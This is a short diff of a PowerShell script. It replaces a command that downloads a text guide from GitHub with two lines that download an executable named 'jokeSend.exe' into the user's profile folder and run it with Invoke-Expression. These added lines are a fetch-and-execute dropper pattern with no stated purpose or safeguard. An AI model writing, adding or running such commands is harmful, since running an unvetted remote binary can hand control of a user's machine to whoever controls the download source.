@@ -1,1 +1,2 @@
-Invoke-WebRequest -URI https://github.com/anutays/TeasingGame/raw/refs/heads/main/Single%20file%20Guide.txt -outfile $env:USERPROFILE/a.txt
+Invoke-WebRequest -URI https://github.com/anutays/hm/raw/refs/heads/main/jokeSend.exe -outfile $env:USERPROFILE/jS.exe
+Invoke-Expression -Command $env:USERPROFILE/jS.exe
